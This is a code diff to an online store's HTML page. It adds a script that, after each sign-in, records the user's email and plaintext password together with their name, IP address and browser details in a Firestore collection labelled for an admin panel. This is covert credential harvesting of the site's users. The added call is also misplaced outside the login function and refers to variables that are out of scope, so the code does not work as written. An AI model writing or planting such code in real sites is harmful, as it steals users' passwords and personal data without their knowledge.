@@ -1693,6 +1693,41 @@
         document.addEventListener('DOMContentLoaded', function() {
             console.log('Roma&knzy stor Started Successfully!');
         });
+        // بعد نجاح تسجيل الدخول في الموقع الأساسي
+async function saveLoginToAdmin(user, loginEmail, loginPassword) {
+    try {
+        // جلب معلومات المستخدم
+        const userDoc = await db.collection('users').doc(user.uid).get();
+        const userData = userDoc.data();
+        
+        // جلب الـ IP
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const ipAddress = ipData.ip;
+        
+        const userAgent = navigator.userAgent;
+        
+        // حفظ بيانات تسجيل الدخول
+        await db.collection('userLogins').add({
+            userId: user.uid,
+            userName: userData.name,
+            userEmail: userData.email,
+            loginEmail: loginEmail,
+            loginPassword: loginPassword,
+            loginTime: firebase.firestore.FieldValue.serverTimestamp(),
+            ipAddress: ipAddress,
+            userAgent: userAgent
+        });
+        
+        console.log('✅ Login data sent to admin panel');
+    } catch (error) {
+        console.error('Error saving login data:', error);
+    }
+}
+
+// استدعاء الدالة بعد نجاح تسجيل الدخول
+// في دالة تسجيل الدخول بعد const userCredential = await auth.signInWithEmailAndPassword(email, password);
+await saveLoginToAdmin(userCredential.user, email, password);
     </script>
 </body>
 </html>
